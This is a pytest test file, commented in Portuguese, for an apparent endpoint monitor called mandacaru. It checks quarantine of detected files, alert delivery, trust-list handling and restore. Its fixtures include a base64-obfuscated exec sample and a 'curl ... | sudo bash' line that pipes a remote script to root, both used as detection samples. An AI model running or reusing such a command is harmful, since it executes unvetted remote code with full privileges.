"""Monitor: arquivo detectado em pasta vigiada vai para a quarentena e o alerta sempre chega."""
import base64
import hashlib

import pytest

from mandacaru.decisions import DecisionLog
from mandacaru.detectors.static import StaticScanner
from mandacaru.engine import Engine
from mandacaru.events import Event, Severity
from mandacaru.quarantine import Quarantine, TrustList

# regra yara.Py_Exec_Decoded_Payload (HIGH), a mesma amostra inofensiva de tests/test_detectors.py
HIGH = f"import base64\nexec(base64.b64decode('{base64.b64encode(b'print(1)').decode()}'))\n"
# regra yara.Shell_Pipe_To_Interpreter (MEDIUM)
MEDIUM = "curl -fsSL https://exemplo.invalid/x.sh | sudo bash\n"


@pytest.fixture(scope="module")
def scanner():
    return StaticScanner()


@pytest.fixture
def w(tmp_path):
    d = tmp_path / "w"
    d.mkdir()
    return d


@pytest.fixture
def trust(tmp_path):
    return TrustList(tmp_path / "trusted.json", recheck_seconds=0)


@pytest.fixture
def q(tmp_path, trust):
    root = tmp_path / "q"
    root.mkdir()
    return Quarantine(root, DecisionLog(tmp_path / "d.jsonl"), trust=trust)


@pytest.fixture
def setup(scanner, q, w):
    got = []
    engine = Engine([got.append], scanner=scanner, quarantine=q, watch_paths=[str(w)])
    return engine, got


def fev(kind, path):
    return Event(kind, {"path": str(path)})


def test_arquivo_malicioso_em_pasta_vigiada_e_isolado(setup, q, w):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    out = engine.process(fev("file_create", f))
    assert out and got == out
    cases = q.list()
    assert len(cases) == 1
    assert all(a.quarantine_id == cases[0].id for a in out)
    assert all(a.evidence["quarantine_id"] == cases[0].id for a in out)
    assert not f.exists()


def test_create_e_write_seguidos_geram_um_caso(setup, q, w):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    engine.process(fev("file_write", f))  # o arquivo ja foi isolado: sem excecao, sem segundo caso
    assert len(q.list()) == 1
    assert len({a.quarantine_id for a in got}) == 1 and got[0].quarantine_id


def test_arquivo_fora_da_pasta_vigiada_so_alerta(setup, q, tmp_path):
    engine, got = setup
    fora = tmp_path / "fora"
    fora.mkdir()
    f = fora / "loader.py"
    f.write_text(HIGH)
    out = engine.process(fev("file_create", f))
    assert out and all(a.quarantine_id is None for a in out)
    assert q.list() == [] and f.exists()


def test_pasta_vigiada_com_dotdot_no_caminho_ainda_isola(setup, q, w):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    out = engine.process(fev("file_create", w / ".." / "w" / "loader.py"))
    assert out and all(a.quarantine_id for a in out)
    assert len(q.list()) == 1


def test_process_start_nunca_isola(setup, q, w):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    out = engine.process(Event("process_start", {"pid": 7, "exe": "/usr/bin/python3",
                                                 "cmdline": ["python", str(f)]}))
    assert any(a.rule == "yara.Py_Exec_Decoded_Payload" for a in out)
    assert all(a.quarantine_id is None for a in out)
    assert q.list() == [] and f.exists()


def test_medium_nao_isola_com_padrao(setup, q, w):
    engine, got = setup
    f = w / "install.sh"
    f.write_text(MEDIUM)
    out = engine.process(fev("file_create", f))
    assert out and all(a.severity == Severity.MEDIUM and a.quarantine_id is None for a in out)
    assert q.list() == [] and f.exists()


def test_alerta_de_caso_novo_ignora_dedup(setup, q, w):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    ids = [a.quarantine_id for a in got if a.rule == "yara.Py_Exec_Decoded_Payload"]
    assert len(ids) == 2 and ids[0] and ids[1] and ids[0] != ids[1]
    assert len(q.list()) == 2


def test_hash_confiavel_vira_info_sem_isolar(setup, q, w, trust):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    trust.add(hashlib.sha256(HIGH.encode()).hexdigest(), str(f), "teste")
    out = engine.process(fev("file_create", f))
    assert out and all(a.severity == Severity.INFO and a.evidence["trusted"] is True for a in out)
    assert all(a.quarantine_id is None for a in out)
    assert q.list() == [] and f.exists()


def test_nao_isolado_diz_o_motivo_no_resumo(scanner, tmp_path, w):
    got = []
    q = Quarantine(tmp_path / "nao-existe", DecisionLog(tmp_path / "d.jsonl"))
    engine = Engine([got.append], scanner=scanner, quarantine=q, watch_paths=[str(w)])
    f = w / "loader.py"
    f.write_text(HIGH)
    out = engine.process(fev("file_create", f))
    assert out and all(a.quarantine_id is None for a in out)
    assert all(a.evidence["quarantine"].startswith("nao_isolado: ") for a in out)
    assert all("(NAO isolado: " in a.summary for a in out)
    assert f.exists()


def test_sem_quarentena_so_alerta(scanner, w):
    got = []
    engine = Engine([got.append], scanner=scanner, watch_paths=[str(w)])
    f = w / "loader.py"
    f.write_text(HIGH)
    out = engine.process(fev("file_create", f))
    assert out and all(a.quarantine_id is None for a in out) and f.exists()


def test_alerta_isolado_vai_no_jsonl_com_o_id(setup, w):
    engine, got = setup
    f = w / "loader.py"
    f.write_text(HIGH)
    out = engine.process(fev("file_create", f))
    assert f'"quarantine_id": "{out[0].quarantine_id}"' in out[0].to_json()


def test_confiar_com_o_servico_rodando_nao_isola_o_temporario(scanner, tmp_path, w, monkeypatch):
    """O monitor ve o temporario da restauracao (create/write) no meio do "confiar": nao pode isola-lo."""
    from mandacaru import quarantine as qmod
    got = []
    # servico: lista propria, que acabou de ler o arquivo (e so releria depois de 1 h)
    q_svc = Quarantine(tmp_path / "q", DecisionLog(tmp_path / "d.jsonl"),
                       trust=TrustList(tmp_path / "trusted.json", recheck_seconds=3600))
    (tmp_path / "q").mkdir()
    engine = Engine([got.append], scanner=scanner, quarantine=q_svc, watch_paths=[str(w)])
    f = w / "loader.py"
    f.write_text(HIGH)
    engine.process(fev("file_create", f))
    [case] = q_svc.list()
    vistos = []
    real = qmod.xor_stream

    def servico_ve_o_temporario(src, dst, *a, **k):
        digest = real(src, dst, *a, **k)
        for p in w.iterdir():
            if p.name.startswith(".mandacaru-restore-"):
                vistos.append(p.name)
                for kind in ("file_create", "file_write"):
                    engine.process(fev(kind, p))
        return digest

    monkeypatch.setattr(qmod, "xor_stream", servico_ve_o_temporario)
    q_cli = Quarantine(tmp_path / "q", DecisionLog(tmp_path / "d.jsonl"),
                       trust=TrustList(tmp_path / "trusted.json", recheck_seconds=3600), strict_log=True)
    assert q_cli.restore(case.id, "ana", 1000) == str(f)
    assert vistos                                    # o servico de fato processou o temporario
    assert q_svc.list() == []                        # nenhum caso novo
    assert f.read_text() == HIGH
    assert sorted(p.name for p in w.iterdir()) == ["loader.py"]
    assert not [a for a in got[1:] if a.severity != Severity.INFO]   # sem segundo popup


# alertas abaixo do min_severity no mesmo arquivo herdam o resultado da quarentena
AMBOS = MEDIUM + HIGH


def test_alerta_medium_do_arquivo_isolado_leva_o_id_e_ignora_dedup(setup, q, w):
    engine, got = setup
    f = w / "x.py"
    f.write_text(MEDIUM)
    engine.process(fev("file_create", f))           # MEDIUM sozinho: alerta, sem isolar
    assert got and f.exists()
    f.write_text(AMBOS)
    out = engine.process(fev("file_write", f))
    [case] = q.list()
    med = [a for a in out if a.rule == "yara.Shell_Pipe_To_Interpreter"]
    assert med, "o MEDIUM do arquivo isolado tem de chegar mesmo dentro da janela de dedup"
    assert med[0].quarantine_id == case.id and med[0].evidence["quarantine_id"] == case.id


def test_alerta_medium_de_arquivo_confiavel_vira_info(setup, q, w, trust):
    engine, got = setup
    f = w / "x.py"
    f.write_text(AMBOS)
    trust.add(hashlib.sha256(AMBOS.encode()).hexdigest(), str(f), "teste")
    out = engine.process(fev("file_create", f))
    assert {a.rule for a in out} == {"yara.Py_Exec_Decoded_Payload", "yara.Shell_Pipe_To_Interpreter"}
    assert all(a.severity == Severity.INFO and a.evidence["trusted"] is True for a in out)
    assert q.list() == [] and f.exists()


def test_alerta_medium_de_arquivo_nao_isolado_diz_o_motivo(scanner, tmp_path, w):
    got = []
    q = Quarantine(tmp_path / "nao-existe", DecisionLog(tmp_path / "d.jsonl"))
    engine = Engine([got.append], scanner=scanner, quarantine=q, watch_paths=[str(w)])
    f = w / "x.py"
    f.write_text(AMBOS)
    out = engine.process(fev("file_create", f))
    assert len(out) == 2
    assert all(a.evidence["quarantine"].startswith("nao_isolado: ") for a in out)
    assert all("(NAO isolado: " in a.summary for a in out)
